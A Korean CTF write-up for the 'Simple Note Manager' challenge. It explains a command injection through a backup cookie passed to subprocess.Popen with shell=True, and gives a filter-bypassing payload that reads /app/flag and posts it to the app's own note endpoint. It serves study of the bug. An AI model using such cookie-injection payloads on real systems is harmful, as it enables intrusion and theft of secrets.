---
title: "Simple Note Manager (DH, B2)"
date: 2026-07-06
draft: false
tags: ["Command Injection"]
ShowToc: true
---

## TL;DR
- 취약점: `/backup_notes`가 `backup-timestamp` 쿠키를 `subprocess.Popen(f'...{ts}', shell=True)`에 삽입 → OS Command Injection
- 트릭: 쿠키라 `;`·공백 금지 → `$()` + `${IFS}` 우회. Popen은 non-blocking = blind → self-exfil(서버가 자기 `/create_note`에 flag 저장)
- 페이로드:
```
backup-timestamp=1234$(curl${IFS}--data-urlencode${IFS}content@/app/flag${IFS}http://127.0.0.1:5000/create_note)
```

## 흐름
| 경로 | 입력 | 통제주체 | 역할 |
|---|---|---|---|
| /create_note | content (form) | 공격자 | 노트 생성 → self-exfil 저장소로 재활용 |
| /update_note | note_id, content (form) | 공격자 | 수정 |
| /delete_note | note_id (form) | 공격자 | 삭제 |
| /backup_notes | backup-timestamp (cookie) | 공격자 | 백업 → sink |

공격자 → POST /backup_notes(쿠키 주입) → 서버가 자기 /create_note 호출(flag 저장) → GET /notes로 회수

## 익스플로잇
```python
def backup_notes(timestamp):                       # timestamp = backup-timestamp 쿠키
    ...
    subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)
```
1. 노트 1개 생성 — 전제조건 `len(notes)!=0` 해제
2. 내부 포트 확인 — 외부(18871) ≠ 내부. 마커로 탐색 → 5000
3. 경로 확인 — `/flag` 관례 실패 → `ls -la /` → `/app` → `/app/flag`
4. flag 읽기 — 최종 페이로드 쿠키로 백업 요청 → 노트로 회수
- 제출: POST /backup_notes  |  회수: GET /notes
```
Cookie: backup-timestamp=1234$(curl${IFS}--data-urlencode${IFS}content@/app/flag${IFS}http://127.0.0.1:5000/create_note)
```

## 함정 & 판별점
- 삽질: 내부 포트 ≠ 외부(18871로 쏴서 connection refused → blind라 무증상) / `/flag` 경로 가정 실패 / `find /`는 `/proc`·`/sys` 늪이라 파이프 소비자가 대기 → 결과 안 옴
- 판별점: 사용자 입력이 셸 문자열에 f-string으로 들어가고 `shell=True`면 CI 확정. sink가 `Popen`(non-blocking)이면 timing·응답 둘 다 죽음 → self-exfil 필요